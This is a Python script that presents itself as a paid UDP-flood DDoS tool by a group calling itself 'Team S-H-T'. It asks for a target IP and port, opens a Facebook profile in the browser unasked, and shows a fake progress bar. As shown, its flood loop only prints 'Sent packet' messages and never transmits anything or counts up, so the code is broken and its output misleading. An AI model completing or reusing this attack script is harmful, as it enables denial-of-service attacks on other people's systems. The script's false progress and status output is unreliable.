print ("\033[91m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
os.system("xdg-open https://www.facebook.com/profile.php?id=61551487702871&mibextid=ZbWKwL")
os.system("clear")
os.system("figlet Team S-H-T")
print ("\033[34mDeveloper.             : R.M Rony Ali ")
print ("Author                 : Team S-H-T")
print ("Tool's Status          : Ddos Attack")
print ("Tools Type             : Paid ")
print ("Search On Google       : saikohaclerteamrm.free.nf")
print ("\033[1;92m           We Hack To Defend The Digital World.")
print 
ip = input(" Target Ip : ")
port = input("Port       : ")
os.system("clear")
print("\033[35m")
os.system("figlet Team S-H-T")
print("Team : Saiko Hacker Team {R.M}")
print ("033[31m")
print ("[                    ] 0% ")
time.sleep(5)
print ("[=====               ] 25%")
time.sleep(5)
print ("[==========          ] 50%")
time.sleep(5)
print ("[===============     ] 75%")
time.sleep(5)
print ("[====================] 100%")
time.sleep(3)
sent = 0
while True:
      
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1